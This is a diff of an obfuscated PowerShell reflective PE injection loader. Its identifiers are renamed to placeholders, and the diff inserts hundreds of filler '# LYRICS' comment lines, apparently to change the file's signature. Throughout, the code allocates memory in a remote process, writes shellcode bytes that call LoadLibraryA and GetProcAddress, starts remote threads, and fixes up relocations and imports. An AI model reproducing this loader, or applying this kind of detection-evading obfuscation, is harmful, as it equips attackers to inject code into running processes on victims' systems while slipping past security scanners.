                 $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Executable'
             }
             else {
                 Throw "ERROR08"
             }
-
+# LYRICS501
             return $VAR0126
         }
-
+# LYRICS502
         Function FUN018 {
+# LYRICS503
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
                 $VAR0161,
-
+# LYRICS504
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
                 $VAR0162
             )
-
+# LYRICS505
             $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
-
+# LYRICS506
+# LYRICS507
             $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)
+# LYRICS508
             $VAR0165 = [UIntPtr][UInt64]([UInt64]$VAR0164.Length + 1)
             $VAR0166 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+# LYRICS509
             if ($VAR0166 -eq [IntPtr]::Zero) {
                 Throw "ERROR09"
             }
-
+# LYRICS510
             [UIntPtr]$VAR0167 = [UIntPtr]::Zero
+# LYRICS511
             $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0166, $VAR0162, $VAR0165, [Ref]$VAR0167)
-
+# LYRICS512
             if ($Success -eq $false) {
                 Throw "ERROR10"
             }
             if ($VAR0165 -ne $VAR0167) {
                 Throw "ERROR11"
             }
-
+# LYRICS513
             $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
+# LYRICS514
             $VAR0169 = $VAR0042.FUN036.Invoke($VAR0168, "LoadLibraryA") 
-
+# LYRICS515
             [IntPtr]$VAR0181 = [IntPtr]::Zero
-            
-            
+# LYRICS516
+# LYRICS517
             if ($VAR0126.CONST032 -eq $true) {
-                
+# LYRICS518
                 $VAR0170 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+# LYRICS519
                 if ($VAR0170 -eq [IntPtr]::Zero) {
                     Throw "ERROR12"
                 }
-
+# LYRICS520
                 [Byte[]]$VAR0174 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
+# LYRICS521
                 $VAR0175 = 72,186
                 $VAR0176 = 255,210,72,186
+# LYRICS522
                 $VAR0177 = 72,137,2,72,137,220,91,195
-
+# LYRICS523
                 $VAR0171 = $VAR0174.Length + $VAR0175.Length + $VAR0176.Length + $VAR0177.Length + ($VAR0163 * 3)
+# LYRICS524
                 $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
                 $VAR0173 = $VAR0172
-
+# LYRICS525
                 FUN010 -Bytes $VAR0174 -VAR0129 $VAR0172
+# LYRICS526
                 $VAR0172 = FUN005 $VAR0172 ($VAR0174.Length)
                 [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0166, $VAR0172, $false)
                 $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+# LYRICS527
                 FUN010 -Bytes $VAR0175 -VAR0129 $VAR0172
                 $VAR0172 = FUN005 $VAR0172 ($VAR0175.Length)
+# LYRICS528
                 [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0169, $VAR0172, $false)
                 $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+# LYRICS529
                 FUN010 -Bytes $VAR0176 -VAR0129 $VAR0172
                 $VAR0172 = FUN005 $VAR0172 ($VAR0176.Length)
                 [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0170, $VAR0172, $false)
                 $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                 FUN010 -Bytes $VAR0177 -VAR0129 $VAR0172
+# LYRICS530
                 $VAR0172 = FUN005 $VAR0172 ($VAR0177.Length)
-
+# LYRICS531
                 $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+# LYRICS532
                 if ($VAR0178 -eq [IntPtr]::Zero) {
+# LYRICS533
                     Throw "ERROR13"
                 }
-
+# LYRICS534
                 $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
+# LYRICS535
                 if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                     Throw "ERROR14"
                 }
-
+# LYRICS536
                 $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+# LYRICS537
                 $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                 if ($VAR0144 -ne 0) {
                     Throw "ERROR15"
                 }
-
-                
+# LYRICS538
+# LYRICS539
                 [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
                 $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0170, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
+# LYRICS540
                 if ($VAR0144 -eq $false) {
                     Throw "ERROR16"
                 }
                 [IntPtr]$VAR0181 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])
-
+# LYRICS541
                 $VAR0042.FUN039.Invoke($VAR0161, $VAR0170, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
+# LYRICS542
                 $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
             }
             else {
+# LYRICS543
                 [IntPtr]$VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0169 -VAR0152 $VAR0166 -VAR0042 $VAR0042
+# LYRICS544
                 $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                 if ($VAR0144 -ne 0) {
                     Throw "ERROR17."
                 }
-
+# LYRICS545
                 [Int32]$VAR0182 = 0
+# LYRICS546
                 $VAR0144 = $VAR0042.FUN048.Invoke($VAR0179, [Ref]$VAR0182)
+# LYRICS547
                 if (($VAR0144 -eq 0) -or ($VAR0182 -eq 0)) {
                     Throw "ERROR18"
                 }
-
+# LYRICS548
                 [IntPtr]$VAR0181 = [IntPtr]$VAR0182
             }
-
+# LYRICS549
             $VAR0042.FUN039.Invoke($VAR0161, $VAR0166, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
-
+# LYRICS550
             return $VAR0181
         }
-
+# LYRICS551
         Function FUN019 {
+# LYRICS552
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
                 $VAR0161,
-
+# LYRICS553
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
                 $VAR0183,
-
+# LYRICS554
                 [Parameter(Position = 2, Mandatory = $true)]
                 [IntPtr]
                 $VAR0184, 
-
+# LYRICS555
                 [Parameter(Position = 3, Mandatory = $true)]
                 [Bool]
                 $VAR0185
             )
-
+# LYRICS556
             $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
-
+# LYRICS557
             [IntPtr]$VAR0186 = [IntPtr]::Zero   
-            
+# LYRICS558
             if (-not $VAR0185) {
+# LYRICS559
                 $VAR0187 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0184)
-
-                
+# LYRICS560
+# LYRICS561
+# LYRICS562
                 $VAR0188 = [UIntPtr][UInt64]([UInt64]$VAR0187.Length + 1)
+# LYRICS563
                 $VAR0186 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0188, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+# LYRICS564
                 if ($VAR0186 -eq [IntPtr]::Zero) {
                     Throw "ERROR17"
                 }
-
+# LYRICS565
                 [UIntPtr]$VAR0167 = [UIntPtr]::Zero
+# LYRICS566
                 $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0186, $VAR0184, $VAR0188, [Ref]$VAR0167)
+# LYRICS567
                 if ($Success -eq $false) {
                     Throw "ERROR18"
                 }
@@ -1259,340 +1553,405 @@ function FUN000 {
                     Throw "ERROR19"
                 }
             }
-            
+# LYRICS568
             else {
                 $VAR0186 = $VAR0184
             }
-
-            
+# LYRICS569
+# LYRICS570
             $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
+# LYRICS571
             $VAR0058 = $VAR0042.FUN036.Invoke($VAR0168, $VAR0312) 
-
-            
+# LYRICS572
+# LYRICS573
             $VAR0189 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UInt64][UInt64]$VAR0163, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
+# LYRICS574
             if ($VAR0189 -eq [IntPtr]::Zero) {
+# LYRICS575
                 Throw "ERROR20"
             }
-
-            
-            
+# LYRICS576
+# LYRICS577
+# LYRICS578
             [Byte[]]$VAR0190 = @()
             if ($VAR0126.CONST032 -eq $true) {
                 $VAR01901 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
+# LYRICS579
                 $VAR01902 = 72,186
                 $VAR01903 = 72,184
+# LYRICS580
                 $VAR01904 = 255,208,72,185
                 $VAR01905 = 72,137,1,72,137,220,91,195
             }
             else {
                 $VAR01901 = 83,137,227,131,228,192,184
                 $VAR01902 = 185
+# LYRICS581
                 $VAR01903 = 81,80,184
+# LYRICS582
                 $VAR01904 = 255,208,185
                 $VAR01905 = 137,1,137,220,91,195
             }
             $VAR0171 = $VAR01901.Length + $VAR01902.Length + $VAR01903.Length + $VAR01904.Length + $VAR01905.Length + ($VAR0163 * 4)
+# LYRICS583
             $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
             $VAR0173 = $VAR0172
-
+# LYRICS584
             FUN010 -Bytes $VAR01901 -VAR0129 $VAR0172
             $VAR0172 = FUN005 $VAR0172 ($VAR01901.Length)
+# LYRICS585
             [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0183, $VAR0172, $false)
             $VAR0172 = FUN005 $VAR0172 ($VAR0163)
+# LYRICS586
             FUN010 -Bytes $VAR01902 -VAR0129 $VAR0172
             $VAR0172 = FUN005 $VAR0172 ($VAR01902.Length)
+# LYRICS587
             [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0186, $VAR0172, $false)
             $VAR0172 = FUN005 $VAR0172 ($VAR0163)
             FUN010 -Bytes $VAR01903 -VAR0129 $VAR0172
             $VAR0172 = FUN005 $VAR0172 ($VAR01903.Length)
+# LYRICS588
             [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0058, $VAR0172, $false)
             $VAR0172 = FUN005 $VAR0172 ($VAR0163)
             FUN010 -Bytes $VAR01904 -VAR0129 $VAR0172
+# LYRICS589
             $VAR0172 = FUN005 $VAR0172 ($VAR01904.Length)
             [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0189, $VAR0172, $false)
+# LYRICS590
             $VAR0172 = FUN005 $VAR0172 ($VAR0163)
             FUN010 -Bytes $VAR01905 -VAR0129 $VAR0172
             $VAR0172 = FUN005 $VAR0172 ($VAR01905.Length)
-
+# LYRICS591
             $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
+# LYRICS592
             if ($VAR0178 -eq [IntPtr]::Zero) {
                 Throw "ERROR21"
             }
             [UIntPtr]$VAR0167 = [UIntPtr]::Zero
+# LYRICS593
             $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
+# LYRICS594
             if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                 Throw "ERROR22"
             }
-
+# LYRICS595
             $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+# LYRICS596
             $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
             if ($VAR0144 -ne 0) {
                 Throw "ERROR23"
             }
-
-            
+# LYRICS597
+# LYRICS598
             [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
+# LYRICS599
             $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0189, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
+# LYRICS600
             if (($VAR0144 -eq $false) -or ($VAR0167 -eq 0)) {
                 Throw "ERROR24"
             }
             [IntPtr]$VAR0191 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])
-
-            
+# LYRICS601
+# LYRICS602
             $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
+# LYRICS603
             $VAR0042.FUN039.Invoke($VAR0161, $VAR0189, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
-
+# LYRICS604
             if (-not $VAR0185) {
+# LYRICS605
                 $VAR0042.FUN039.Invoke($VAR0161, $VAR0186, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
             }
-
+# LYRICS606
             return $VAR0191
         }
-
-
+# LYRICS607
+# LYRICS608
         Function FUN020 {
+# LYRICS609
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Byte[]]
                 $VAR001,
-
+# LYRICS610
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR0126,
-
+# LYRICS611
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR0042,
-
+# LYRICS612
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
                 $VAR010
             )
-
+# LYRICS613
             for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
+# LYRICS614
                 [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
                 $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
-
-                
+# LYRICS615
+# LYRICS616
+# LYRICS617
                 [IntPtr]$VAR0193 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0192.CONST074))
-
-                
-                
-                
-                
+# LYRICS618
+# LYRICS619
+# LYRICS620
+# LYRICS621
+# LYRICS622
                 $VAR0194 = $VAR0192.CONST144
-
+# LYRICS623
                 if ($VAR0192.CONST145 -eq 0) {
+# LYRICS624
                     $VAR0194 = 0
                 }
-
+# LYRICS625
                 if ($VAR0194 -gt $VAR0192.CONST143) {
+# LYRICS626
                     $VAR0194 = $VAR0192.CONST143
                 }
-
+# LYRICS627
                 if ($VAR0194 -gt 0) {
                     FUN009 -VAR0125 "FUN020::MarshalCopy" -VAR0126 $VAR0126 -VAR0127 $VAR0193 -Size $VAR0194 | Out-Null
+# LYRICS628
                     [System.Runtime.InteropServices.Marshal]::Copy($VAR001, [Int32]$VAR0192.CONST145, $VAR0193, $VAR0194)
+# LYRICS629
                 }
-
-                
+# LYRICS630
+# LYRICS631
                 if ($VAR0192.CONST144 -lt $VAR0192.CONST143) {
                     $VAR0195 = $VAR0192.CONST143 - $VAR0194
+# LYRICS632
                     [IntPtr]$VAR0127 = [IntPtr](FUN005 ([Int64]$VAR0193) ([Int64]$VAR0194))
+# LYRICS633
                     FUN009 -VAR0125 "FUN020::FUN034" -VAR0126 $VAR0126 -VAR0127 $VAR0127 -Size $VAR0195 | Out-Null
+# LYRICS634
                     $VAR0042.FUN034.Invoke($VAR0127, 0, [IntPtr]$VAR0195) | Out-Null
                 }
             }
         }
-
-
+# LYRICS635
+# LYRICS636
         Function FUN021 {
+# LYRICS637
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
                 $VAR0126,
-
+# LYRICS638
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
                 $VAR0196,
-
+# LYRICS639
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR0041,
-
+# LYRICS640
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
                 $VAR010
             )
-
+# LYRICS641
             [Int64]$VAR0197 = 0
+# LYRICS642
             $VAR0198 = $true 
+# LYRICS643
             [UInt32]$VAR0199 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST150)
-
-            
+# LYRICS644
+# LYRICS645
             if (($VAR0196 -eq [Int64]$VAR0126.CONST039) `
                     -or ($VAR0126.CONST031.CONST122.CONST112.Size -eq 0)) {
+# LYRICS646
                 return
             }
-
-
+# LYRICS647
+# LYRICS648
             elseif ((FUN006 ($VAR0196) ($VAR0126.CONST039)) -eq $true) {
+# LYRICS649
                 $VAR0197 = FUN004 ($VAR0196) ($VAR0126.CONST039)
                 $VAR0198 = $false
             }
             elseif ((FUN006 ($VAR0126.CONST039) ($VAR0196)) -eq $true) {
+# LYRICS650
                 $VAR0197 = FUN004 ($VAR0126.CONST039) ($VAR0196)
             }
-
-            
+# LYRICS651
+# LYRICS652
             [IntPtr]$VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST112.CONST074))
+# LYRICS653
             while ($true) {
-                
+# LYRICS654
                 $VAR0201 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0200, [Type]$VAR010.CONST150)
-
+# LYRICS655
                 if ($VAR0201.CONST151 -eq 0) {
                     break
                 }
-
+# LYRICS656
                 [IntPtr]$VAR0202 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0201.CONST074))
+# LYRICS657
                 $VAR0203 = ($VAR0201.CONST151 - $VAR0199) / 2
-
-                
+# LYRICS658
+# LYRICS659
                 for ($i = 0; $i -lt $VAR0203; $i++) {
-                    
+# LYRICS660
                     $VAR0204 = [IntPtr](FUN005 ([IntPtr]$VAR0200) ([Int64]$VAR0199 + (2 * $i)))
+# LYRICS661
                     [UInt16]$VAR0205 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0204, [Type][UInt16])
-
-                    
+# LYRICS662
+# LYRICS663
                     [UInt16]$VAR0206 = $VAR0205 -band 0x0FFF
+# LYRICS664
                     [UInt16]$VAR0207 = $VAR0205 -band 0xF000
                     for ($j = 0; $j -lt 12; $j++) {
                         $VAR0207 = [Math]::Floor($VAR0207 / 2)
                     }
-
-                    
-                    
-                    
+# LYRICS665
+# LYRICS666
+# LYRICS667
+# LYRICS668
                     if (($VAR0207 -eq $VAR0041.CONST013) `
                             -or ($VAR0207 -eq $VAR0041.CONST014)) {
-                        
+# LYRICS669
+# LYRICS670
                         [IntPtr]$VAR0208 = [IntPtr](FUN005 ([Int64]$VAR0202) ([Int64]$VAR0206))
+# LYRICS671
                         [IntPtr]$VAR0209 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0208, [Type][IntPtr])
-
+# LYRICS672
                         if ($VAR0198 -eq $true) {
+# LYRICS673
                             [IntPtr]$VAR0209 = [IntPtr](FUN005 ([Int64]$VAR0209) ($VAR0197))
                         }
                         else {
+# LYRICS674
                             [IntPtr]$VAR0209 = [IntPtr](FUN004 ([Int64]$VAR0209) ($VAR0197))
                         }
-
+# LYRICS675
                         [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0209, $VAR0208, $false) | Out-Null
                     }
                     elseif ($VAR0207 -ne $VAR0041.CONST012) {
-                        
+# LYRICS676
                         Throw "ERROR25: $VAR0207, ERROR26: $VAR0205"
                     }
                 }
-
+# LYRICS677
                 $VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0200) ([Int64]$VAR0201.CONST151))
             }
         }
-
-
+# LYRICS678
+# LYRICS679
         Function FUN022 {
+# LYRICS680
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
                 $VAR0126,
-
+# LYRICS681
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR0042,
-
+# LYRICS682
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR010,
-
+# LYRICS683
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
                 $VAR0041,
-
+# LYRICS684
                 [Parameter(Position = 4, Mandatory = $false)]
                 [IntPtr]
                 $VAR0161
             )
-
+# LYRICS685
             $VAR0210 = $false
             if ($VAR0126.VAR0263 -ne $VAR0126.CONST039) {
+# LYRICS686
                 $VAR0210 = $true
             }
-
+# LYRICS687
             if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
+# LYRICS688
                 [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
-
+# LYRICS689
                 while ($true) {
+# LYRICS690
                     $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
-
-                    
+# LYRICS691
+# LYRICS692
                     if ($VAR0212.CONST067 -eq 0 `
                             -and $VAR0212.CONST154 -eq 0 `
                             -and $VAR0212.CONST153 -eq 0 `
                             -and $VAR0212.Name -eq 0 `
                             -and $VAR0212.CONST071 -eq 0) {
-                        
+# LYRICS693
                         break
                     }
-
+# LYRICS694
                     $VAR0213 = [IntPtr]::Zero
+# LYRICS695
                     $VAR0162 = (FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name))
                     $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)
-
+# LYRICS696
+# LYRICS697
                     if ($VAR0210 -eq $true) {
+# LYRICS698
                         $VAR0213 = FUN018 -VAR0161 $VAR0161 -VAR0162 $VAR0162
                     }
                     else {
                         $VAR0213 = $VAR0042.FUN035.Invoke($VAR0164)
+# LYRICS699
                     }
-
+# LYRICS700
                     if (($VAR0213 -eq $null) -or ($VAR0213 -eq [IntPtr]::Zero)) {
+# LYRICS701
                         throw "ERROR28: $VAR0164"
                     }
-
-                    
+# LYRICS702
+# LYRICS703
                     [IntPtr]$VAR0214 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST154)
+# LYRICS704
                     [IntPtr]$VAR0215 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST067) 
+# LYRICS705
                     [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])
-
+# LYRICS706
                     while ($VAR0216 -ne [IntPtr]::Zero) {
+# LYRICS707
                         $VAR0185 = $false
                         [IntPtr]$VAR0217 = [IntPtr]::Zero
-                        
-                        
-                        
+# LYRICS708
+# LYRICS709
+# LYRICS710
                         [IntPtr]$VAR0218 = [IntPtr]::Zero
+# LYRICS711
                         if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$VAR0216 -lt 0) {
                             [IntPtr]$VAR0217 = [IntPtr]$VAR0216 -band 0xffff 
                             $VAR0185 = $true
+# LYRICS712
                         }
                         elseif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$VAR0216 -lt 0) {
+# LYRICS713
                             [IntPtr]$VAR0217 = [Int64]$VAR0216 -band 0xffff 
                             $VAR0185 = $true
                         }
                         else {
                             [IntPtr]$VAR0219 = FUN005 ($VAR0126.VAR0263) ($VAR0216)
+# LYRICS714
                             $VAR0219 = FUN005 $VAR0219 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                             $VAR0220 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0219)
+# LYRICS715
                             $VAR0217 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0220)
                         }
-
+# LYRICS716
                         if ($VAR0210 -eq $true) {
+# LYRICS717
                             [IntPtr]$VAR0218 = FUN019 -VAR0161 $VAR0161 -VAR0183 $VAR0213 -VAR0184 $VAR0217 -VAR0185 $VAR0185
                         }
                         else {
                             [IntPtr]$VAR0218 = $VAR0042.FUN037.Invoke($VAR0213, $VAR0217)
                         }
-
+# LYRICS718
                         if ($VAR0218 -eq $null -or $VAR0218 -eq [IntPtr]::Zero) {
+# LYRICS719
                             if ($VAR0185) {
                                 Throw "ERROR30: $VAR0217 $VAR0164"
                             }
@@ -1600,36 +1959,42 @@ function FUN000 {
                                 Throw "ERROR31: $VAR0220 $VAR0164"
                             }
                         }
-
+# LYRICS720
                         [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0218, $VAR0214, $false)
-
+# LYRICS721
                         $VAR0214 = FUN005 ([Int64]$VAR0214) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+# LYRICS722
                         [IntPtr]$VAR0215 = FUN005 ([Int64]$VAR0215) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
+# LYRICS723
                         [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])
-
-                        
-                        
+# LYRICS724
+# LYRICS725
+# LYRICS726
                         if ((-not $VAR0185) -and ($VAR0217 -ne [IntPtr]::Zero)) {
+# LYRICS727
                             [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0217)
                             $VAR0217 = [IntPtr]::Zero
                         }
                     }
-
+# LYRICS728
                     $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                 }
             }
         }
-
+# LYRICS729
         Function FUN023 {
+# LYRICS730
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [UInt32]
                 $VAR0221
             )
-
+# LYRICS731
             $VAR0222 = 0x0
             if (($VAR0221 -band $VAR0041.CONST016) -gt 0) {
+# LYRICS732
                 if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
+# LYRICS733
                     if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
                         $VAR0222 = $VAR0041.CONST008
                     }
@@ -1639,6 +2004,7 @@ function FUN000 {
                 }
                 else {
                     if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
+# LYRICS734
                         $VAR0222 = $VAR0041.CONST010
                     }
                     else {
@@ -1649,6 +2015,7 @@ function FUN000 {
             else {
                 if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
                     if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
+# LYRICS735
                         $VAR0222 = $VAR0041.CONST005
                     }
                     else {
@@ -1657,422 +2024,511 @@ function FUN000 {
                 }
                 else {
                     if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
+# LYRICS736
                         $VAR0222 = $VAR0041.CONST006
                     }
                     else {
                         $VAR0222 = $VAR0041.CONST003
+# LYRICS737
                     }
                 }
             }
-
+# LYRICS738
             if (($VAR0221 -band $VAR0041.CONST019) -gt 0) {
+# LYRICS739
                 $VAR0222 = $VAR0222 -bor $VAR0041.CONST011
             }
-
+# LYRICS740
             return $VAR0222
         }
-
+# LYRICS741
         Function FUN024 {
+# LYRICS742
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
                 $VAR0126,
-        
+# LYRICS743
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR0042,
-        
+# LYRICS744
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR0041,
-        
+# LYRICS745
                 [Parameter(Position = 3, Mandatory = $true)]
                 [System.Object]
                 $VAR010
             )
-        
+# LYRICS746
+# LYRICS747
             for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
+# LYRICS748
                 [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
+# LYRICS749
                 $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
+# LYRICS750
                 [IntPtr]$VAR0223 = FUN005 ($VAR0126.VAR0263) ($VAR0192.CONST074)
-            
+# LYRICS751
                 [UInt32]$VAR0224 = FUN023 $VAR0192.CONST067
                 [UInt32]$VAR0225 = $VAR0192.CONST143
-            
+# LYRICS752
                 [UInt32]$VAR0226 = 0
                 FUN009 -VAR0125 "FUN024::FUN040" -VAR0126 $VAR0126 -VAR0127 $VAR0223 -Size $VAR0225 | Out-Null
+# LYRICS753
                 $Success = $VAR0042.FUN040.Invoke($VAR0223, $VAR0225, $VAR0224, [Ref]$VAR0226)
                 if ($Success -eq $false) {
                     Throw "ERROR32"
                 }
             }
         }
-
-        
-        
+# LYRICS754
+# LYRICS755
+# LYRICS756
         Function FUN025 {
+# LYRICS757
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [System.Object]
                 $VAR0126,
-    
+# LYRICS758
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
                 $VAR0042,
-    
+# LYRICS759
                 [Parameter(Position = 2, Mandatory = $true)]
                 [System.Object]
                 $VAR0041,
-    
+# LYRICS760
                 [Parameter(Position = 3, Mandatory = $true)]
                 [String]
                 $VAR0227,
-    
+# LYRICS761
                 [Parameter(Position = 4, Mandatory = $true)]
                 [IntPtr]
                 $VAR0228
             )
-        
-            
+# LYRICS762
+# LYRICS763
             $VAR0229 = @()
-    
+# LYRICS764
             $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
+# LYRICS765
             [UInt32]$VAR0226 = 0
-    
+# LYRICS766
